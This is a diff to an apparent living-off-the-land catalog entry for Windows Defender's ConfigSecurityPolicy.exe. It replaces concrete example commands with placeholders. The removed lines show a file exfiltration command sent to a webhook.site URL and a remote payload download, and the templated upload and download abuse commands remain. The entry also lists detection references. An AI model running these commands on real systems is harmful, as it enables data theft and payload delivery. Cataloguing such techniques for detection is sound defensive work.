@@ -1,17 +1,17 @@
 ---
 Name: ConfigSecurityPolicy.exe
-Description: Binary part of Windows Defender. Used to manage settings in Windows Defender. you can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.
+Description: Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.
 Author: Ialle Teixeira
 Created: 2020-09-04
 Commands:
-  - Command: ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://webhook.site/xxxxxxxxx?encodedfile
+  - Command: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
     Description: Upload file, credentials or data exfiltration in general
     Usecase: Upload file
     Category: Upload
     Privileges: User
     MitreID: T1567
     OperatingSystem: Windows 10
-  - Command: ConfigSecurityPolicy.exe https://example.com/payload
+  - Command: ConfigSecurityPolicy.exe {REMOTEURL}
     Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
     Category: Download
@@ -23,8 +23,6 @@ Commands:
 Full_Path:
   - Path: C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe
   - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_configsecuritypolicy.yml
   - IOC: ConfigSecurityPolicy storing data into alternate data streams.
